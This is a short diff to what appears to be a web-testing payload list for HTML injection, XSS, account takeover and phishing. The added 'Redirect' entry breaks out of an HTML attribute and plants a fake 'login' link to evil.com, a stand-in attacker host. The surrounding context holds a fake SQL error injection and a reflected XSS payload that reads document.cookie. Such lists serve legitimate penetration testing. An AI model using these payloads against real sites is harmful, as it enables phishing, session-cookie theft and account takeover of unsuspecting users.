@@ -3,6 +3,9 @@ payload for testing HTML/XSS/IFRAME/ATO/PHISHING
 HTMLi:
 <font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
 
+Redirect:
+"/><img src="x"><a href="https://evil.com">login</a>
+
 RXSS:
 <img src/onerror=prompt(document.cookie)>
 
